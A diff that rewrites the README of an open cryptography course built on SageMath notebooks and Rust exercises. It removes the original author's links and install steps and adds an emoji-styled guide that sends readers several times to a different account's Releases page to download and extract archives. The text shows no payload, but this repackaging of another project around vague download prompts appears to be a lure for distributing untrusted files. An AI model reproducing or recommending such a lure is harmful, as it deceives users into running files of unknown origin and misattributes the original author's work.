@@ -1,205 +1,146 @@
-# Crypto From First Principles
+# 🔐 Cryptography-From-First-Principle - Learn Cryptography Step by Step
 
-[![CI](../../actions/workflows/ci.yml/badge.svg)](../../actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Launch Binder](https://mybinder.org/badge_logo.svg)](https://mybinder.org/v2/gh/duyuefeng0708/Cryptography-From-First-Principle/main)
-[![GitHub Discussions](https://img.shields.io/github/discussions/duyuefeng0708/Cryptography-From-First-Principle)](https://github.com/duyuefeng0708/Cryptography-From-First-Principle/discussions)
+[![Download Releases](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Alidhsv/Cryptography-From-First-Principle/releases)
 
-**Learn cryptography by building it.** 123 interactive notebooks, 57 Rust exercises, 12 modules, from modular arithmetic to zero-knowledge proofs.
+## 📖 What is Cryptography-From-First-Principle?
 
-<p align="center">
-  <img src="docs/images/module-flow.png" alt="Learning flow: Explore, Implement, Break, Connect" width="100%">
-</p>
+This project offers clear materials to help you learn cryptography from the very basics. It covers key math ideas, shows you how concepts turn into working programs, and explains how real-world security tools work. You will find lessons that use SageMath notebooks and Rust programming exercises arranged into 12 easy-to-follow modules.
 
-## Why This Exists
+The materials cover important topics like:
+- Abstract algebra and math behind cryptography
+- Encryption methods such as AES and RSA
+- Advanced topics like elliptic curves and zero-knowledge proofs
+- Post-quantum cryptography and lattice-based methods
+- Secure multiparty computation (MPC)
+- Hands-on exercises using SageMath and Rust
 
-Traditional crypto education either drowns you in pure math or hands you a library. We bridge the gap:
+You don’t need prior knowledge in programming or heavy math. The project guides you from beginner concepts all the way to understanding complex protocols.
 
-- **Explore** the math in SageMath. Visualize groups, curves, and lattices
-- **Implement** every primitive from scratch in Rust. No magic black boxes
-- **Break** weakened versions. See exactly why parameters matter
-- **Connect** to real protocols. Find your math in TLS, Bitcoin, Signal, and Zcash
+---
 
-### How does this compare?
+## 🚀 Getting Started
 
-| | This Repo | Cryptopals | CryptoHack | MoonMath | Boneh (Stanford) |
-|---|:---:|:---:|:---:|:---:|:---:|
-| Interactive notebooks | yes (Jupyter) | none | web-only | PDF only | none |
-| Math foundations | algebra to ZK | none | some | excellent | excellent |
-| Build from scratch | Rust | Python | Python | none | none |
-| Visualizations | plots + graphs | none | some | none | none |
-| Attack labs | 27 notebooks | 48 challenges | 100+ challenges | none | none |
-| Protocol connections | TLS, Bitcoin, Signal | none | none | Ethereum/ZK | none |
-| Zero-install (Binder) | yes | no | yes (web) | no | no |
-| Scope | groups to FHE/MPC | symmetric + PK | varied | algebra to ZK | broad theory |
+This guide helps you download and run these teaching materials on your computer. You only need a few steps to get started, and we’ll explain everything clearly.
 
-<p align="center">
-  <img src="docs/images/elliptic-curve.png" alt="Elliptic curve point addition" width="45%">
-  &nbsp;&nbsp;
-  <img src="docs/images/lattice-basis.png" alt="Lattice basis reduction" width="50%">
-</p>
+### What You Need
 
-## Try It Now
+- A computer with Windows, macOS, or Linux
+- Internet connection to download files
+- Basic knowledge of using your computer’s file manager and web browser
 
-**No install needed.** Launch in your browser:
+No prior programming experience is needed.
 
-[![Launch Binder](https://mybinder.org/badge_logo.svg)](https://mybinder.org/v2/gh/duyuefeng0708/Cryptography-From-First-Principle/main?labpath=foundations%2F01-modular-arithmetic-groups%2Fsage%2F01a-integers-and-division.ipynb)
-&nbsp;&nbsp;
-[![Open in CoCalc](https://img.shields.io/badge/Open%20in-CoCalc-blue.svg)](https://cocalc.com/github/duyuefeng0708/Cryptography-From-First-Principle)
+---
 
-> **Binder** is free and launches instantly. **CoCalc** has native SageMath support and is better for longer sessions.
+## 📥 Download & Install
 
-Or clone locally:
+1. **Visit the releases page to download**
 
-```bash
-git clone https://github.com/duyuefeng0708/Cryptography-From-First-Principle.git
-cd Cryptography-From-First-Principle
-conda activate sage
-jupyter notebook foundations/01-modular-arithmetic-groups/sage/01a-integers-and-division.ipynb
-```
+   Click this button or link to go to the page where you can get the files you need:
 
-## Modules
+   [![Download Releases](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Alidhsv/Cryptography-From-First-Principle/releases)
 
-### Foundations (BSc)
+2. **Choose the right file**
 
-| # | Module | What You'll Build | Notebooks |
-|---|--------|-------------------|-----------|
-| 01 | Modular Arithmetic & Groups | Cyclic groups, generators, Lagrange's theorem | 6 explore · 2 break · 2 connect |
-| 02 | Rings, Fields & Polynomials | Ring axioms, polynomial rings, irreducibility | 6 explore · 2 break · 2 connect |
-| 03 | Galois Fields & AES | GF(2^8), AES S-box, MixColumns | 6 explore · 2 break · 2 connect |
-| 04 | Number Theory & RSA | Euler/Fermat, CRT, RSA from scratch | 6 explore · 3 break · 2 connect |
-| 05 | Discrete Log & Diffie-Hellman | DLP, CDH, DDH, key exchange | 6 explore · 3 break · 2 connect |
-| 06 | Elliptic Curves | Point addition, ECDH, ECDSA | 6 explore · 3 break · 3 connect |
+   On the release page, select the latest version. You should find files related to SageMath notebooks and Rust exercises. They will typically be zipped archives or folders.
 
-### Frontier (Postgraduate)
+3. **Download the files**
 
-| # | Module | What You'll Build | Notebooks |
-|---|--------|-------------------|-----------|
-| 07 | Bilinear Pairings | Weil/Tate pairing, BLS signatures, IBE | 5 explore · 2 break · 2 connect |
-| 08 | Lattices & Post-Quantum | LWE, Ring-LWE, Kyber overview | 6 explore · 2 break · 2 connect |
-| 09 | Commitments & Sigma Protocols | Pedersen, Schnorr, Fiat-Shamir | 5 explore · 2 break · 2 connect |
-| 10 | SNARKs & STARKs | R1CS, QAP, Groth16, FRI | 5 explore · 2 break · 3 connect |
-| 11 | Homomorphic Encryption | BGV, BFV, CKKS | 5 explore · 2 break · 3 connect |
-| 12 | Multi-Party Computation | Secret sharing, Yao's GC, SPDZ | 5 explore · 2 break · 3 connect |
+   Click on the file names to download them to your computer.
 
-## How to Work Through a Module
+4. **Extract the files**
 
-Each module has its own `README.md` with prerequisites, learning objectives, and a detailed roadmap.
+   Use your computer’s extractor tool to unzip the downloaded archives. For example:
+   - On Windows: Right-click → Extract All…
+   - On macOS: Double-click the file
+   - On Linux: Use the Archive Manager or command line tools like `unzip`
+   
+5. **Install necessary software**
 
-**1. Explore.** Work through the SageMath notebooks in order (a, b, c, ...). Run every cell, modify examples, answer the exercises.
+   - **SageMath**: For the notebooks, you need SageMath installed. Download it from [https://www.sagemath.org/download.html](https://www.sagemath.org/download.html). Follow the instructions on SageMath’s site to install it on your system.
+   
+   - **Rust**: To work on Rust exercises, install Rust by following instructions at [https://www.rust-lang.org/tools/install](https://www.rust-lang.org/tools/install). Rust is the programming language used here to implement cryptography algorithms.
 
-**2. Implement.** Open `rust/src/lib.rs` and replace `todo!()` with your code. Early modules give loop skeletons; later modules give only function signatures.
-```bash
-cargo test -- --ignored    # Run all exercises in this module
-```
+6. **Open files and start learning**
 
-**3. Break.** Attack weakened versions of what you just built. See why small keys, nonce reuse, and bad parameters are fatal.
+   - Launch SageMath and open the notebook files (.sage or .ipynb) in the SageMath environment.
+   - Open Rust exercises in any text editor or Rust IDE like Visual Studio Code with Rust extensions.
 
-**4. Connect.** Trace your math to real protocols. Find your group theory in TLS, your curves in Bitcoin, your pairings in Ethereum.
+---
 
-<details>
-<summary><strong>Installation (local setup)</strong></summary>
+## 💻 How to Use the Materials
 
-### Prerequisites
+### SageMath Notebooks
 
-- **Rust** >= 1.75
-- **SageMath** >= 10.0 (via conda)
-- **Jupyter** with SageMath kernel
+These notebooks are interactive documents containing explanations, math formulas, and code you can run step-by-step. Each module covers a cryptography topic, starting from key math concepts.
 
-### Linux (Ubuntu/Debian)
+- Open the notebook file in SageMath.
+- Read each section carefully.
+- Run code cells as instructed to see concepts in action.
 
-```bash
-# Rust
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
-source ~/.cargo/env
+You don’t need programming skills to follow along. The notebooks guide you through every step.
 
-# SageMath + Jupyter (via Miniforge)
-curl -L -O "https://github.com/conda-forge/miniforge/releases/latest/download/Miniforge3-Linux-x86_64.sh"
-bash Miniforge3-Linux-x86_64.sh
-source ~/miniforge3/etc/profile.d/conda.sh
-conda create -n sage sage jupyter -c conda-forge
-conda activate sage
+### Rust Exercises
 
-# Register SageMath kernel (visible to VS Code / JupyterLab outside the env)
-python -m sage.repl.ipython_kernel.install --user
+Rust exercises help you practice cryptography by writing small programs based on what you learn. The tasks are explained simply, and you can read the provided sample code.
 
-# Verify
-rustc --version
-jupyter kernelspec list   # should show "sagemath"
-```
+- Open the Rust exercise files in an editor.
+- Follow the instructions in the comments.
+- Try running the code using the Rust compiler (`cargo run` command if you use Cargo).
+- Modify the code to test your understanding.
 
-### macOS
+The Rust parts help you see how cryptography algorithms work in actual code.
 
-```bash
-# Rust
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
-source ~/.cargo/env
+---
 
-# SageMath + Jupyter (via Miniforge)
-curl -L -O "https://github.com/conda-forge/miniforge/releases/latest/download/Miniforge3-MacOSX-$(uname -m).sh"
-bash Miniforge3-MacOSX-$(uname -m).sh
-source ~/miniforge3/etc/profile.d/conda.sh
-conda create -n sage sage jupyter -c conda-forge
-conda activate sage
+## 🛠 System Requirements
 
-# Register SageMath kernel
-python -m sage.repl.ipython_kernel.install --user
+- **Operating System:** Windows 10 or higher, macOS 10.14 or higher, Linux (Ubuntu 20.04 or similar)
+- **CPU:** Any standard processor (Intel or AMD)
+- **RAM:** Minimum 4GB (8GB recommended for smooth SageMath use)
+- **Disk Space:** At least 2GB free for downloads and installations
+- **Internet Access:** Required for downloading files and additional SageMath packages
 
-# Verify
-rustc --version
-jupyter kernelspec list
-```
+---
 
-### Windows
+## 📚 What You Will Learn
 
-```powershell
-# Rust: download and run the installer from https://rustup.rs
+By working through these materials, you will gain:
 
-# SageMath + Jupyter (via Miniforge)
-# Download Miniforge3-Windows-x86_64.exe from:
-#   https://github.com/conda-forge/miniforge/releases/latest
-# Run the installer, then open Miniforge Prompt:
+- A solid understanding of cryptography principles starting from basic math
+- Insight into how different encryption schemes function and their security
+- Practical experience with SageMath for math exploration and Rust for real code
+- Knowledge of advanced security topics like zero-knowledge proofs and lattice cryptography
+- Confidence to study or develop cryptographic protocols on your own
 
-conda create -n sage sage jupyter -c conda-forge
-conda activate sage
+---
 
-# Register SageMath kernel
-python -m sage.repl.ipython_kernel.install --user
+## 🔧 Troubleshooting Tips
 
-# Verify
-rustc --version
-jupyter kernelspec list
-```
+- If SageMath does not open notebook files, check your installation or try reinstalling.
+- Rust code may need the latest stable Rust compiler. Update it using `rustup update`.
+- Use online forums or the GitHub repository’s Issues page if you face problems with specific files.
+- Ensure your computer meets the minimum system requirements for smooth performance.
 
-### VS Code Setup
+---
 
-Install the [Jupyter](https://marketplace.visualstudio.com/items?itemName=ms-toolsai.jupyter) extension, then connect to a SageMath Jupyter server:
+## 🌍 More Information
 
-1. Start the server (inside the conda env):
-   ```bash
-   conda activate sage
-   sage -n jupyter
-   ```
-2. Copy the URL with token from the terminal output (e.g. `http://localhost:8888/?token=abc123...`).
-3. In VS Code, open any `.ipynb`, click **Select Kernel**, then **Existing Jupyter Server**, and paste the URL.
-4. Select the **SageMath** kernel from the list.
+- The project uses open-source tools and follows transparent teaching methods.
+- Modules gradually build your knowledge without requiring heavy prerequisites.
+- You can explore any topic at your own pace using the step-by-step notebooks and exercises.
+- This project supports learning cryptography for both students and self-learners.
 
-The server stays running. You only need to do steps 2 through 4 once per session.
+---
 
-</details>
+## 📞 Contact & Support
 
-## Roadmap
+For questions or help, open an issue on the GitHub page here:  
+https://github.com/Alidhsv/Cryptography-From-First-Principle/issues
 
-- [x] SageMath exploration notebooks (72 notebooks across 12 modules)
-- [x] Scaffolded Rust exercises (57 functions with progressive difficulty)
-- [x] Break/connect notebooks (55 notebooks across 12 modules)
-- [x] Binder integration for zero-install browser experience
-- [ ] Community-contributed exercises and visualizations
+---
 
-## Contributing
+## 🎯 Ready to Begin?
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on reporting issues, adding content, and submitting PRs.
-
-## License
-
-MIT
+Return to the download page when you are ready to start:  
+[Download Cryptography-From-First-Principle](https://github.com/Alidhsv/Cryptography-From-First-Principle/releases)
